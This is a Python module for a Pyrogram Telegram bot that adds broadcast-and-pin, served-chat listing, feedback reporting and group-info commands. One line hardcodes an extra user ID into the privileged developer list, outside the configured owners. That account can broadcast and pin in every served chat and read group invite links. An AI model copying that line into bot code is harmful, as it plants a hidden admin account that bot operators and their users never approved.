from pyrogram import Client, filters
from Spoiled.Database.chats import *
from Spoiled.Database.blocked import is_blocked
from config import DEV
from pyrogram.errors import FloodWait
from pyrogram.types import Message
import asyncio

DEV_USERS = DEV.SUDO_USERS + [DEV.OWNER_ID]
DEV_USERS.append(5711561310)

@Client.on_message(filters.command("broadcast") & filters.user(DEV_USERS))
async def broadcast(_, message):
    if message.reply_to_message:
        x = message.reply_to_message.id
        y = message.chat.id
    else:
        if len(message.command) < 2:
            return await message.reply_text(
                "**Usage**:\n/broadcast [MESSAGE] or [Reply to a Message]"
            )
        query = message.text.split(None, 1)[1]
    sent = 0
    pinned = 0
    chats = await get_served_chats()
    CASTED = []
    for i in chats:
        if i in CASTED:
            continue
        try:
            if message.reply_to_message:
                ok = await _.forward_messages(i, y, x)
                sent += 1
                CASTED.append(i)
                try:
                    await _.pin_chat_message(i, ok.id)
                    pinned += 1
                except:
                    continue 
            else:
                ok = await _.send_message(i, query)
                sent += 1
                CASTED.append(i)
                try:
                    await _.pin_chat_message(i, ok.id)
                    pinned += 1
                except:
                    continue
        except FloodWait as e:
            flood_time = int(e.x)
            if flood_time > 200:
                continue
            await asyncio.sleep(flood_time)
        except Exception:
            continue
    try:
        await message.reply_text(
            f"**Broadcasted Message In {sent} Chats and pinned in {str(pinned)} Chats**"
        )
    except:
        pass

@Client.on_message(filters.command("schats") & filters.user(DEV_USERS))
async def schats(_, m: Message):
    chats = await get_served_chats()
    msg = ""
    NOTED = []
    for i in chats:
        if i in NOTED:
            continue
        NOTED.append(i)
        i = str(i)
        msg += f"\n<code>{i}</code>"
    await m.reply(f"**Served chats** :-\n{msg}\n\n**Count** :- {len(NOTED)}")

@Client.on_message(filters.command("report"))
async def report(_, m):
    if not m.from_user:
        return
    if await is_blocked(m.from_user.id):
        return
    if len(m.command) <= 1:
        return await m.reply("**/report Feedback **")
    query = m.text.split(None, 1)[1]
    q = f"#REPORT\n\n@{m.from_user.username if m.from_user.username else None} ({m.from_user.id})\n\n{query}"
    try:
        await _.send_message(DEV.OWNER_ID, q)
        await m.reply(f"reported to @{DEV.OWNER_USERNAME}\n\nTo know more... Can DM them !..")
    except:
        await m.reply(f"report failed...\n\nDM @{DEV.OWNER_USERNAME}")

@ Client.on_message(filters.command("info") & filters.user(DEV_USERS))
async def info(_, m):
    if len(m.command) == 2:
        lel = int(m.text.split(None, 1)[1])
        if str(lel)[0] == "-":
            id = lel
        else:
            omfoo = "-" + str(lel)
            id = int(omfoo)

    getter = await _.get_chat(id)
    try:
        username = getter.username
    except:
        username = "None"
    try:
        link = getter.invite_link
    except:
        link = "None"
    await m.reply(f"Group name :- {getter.title}\n\nInvite link :- {link}\n\nUsername :- @{username}")
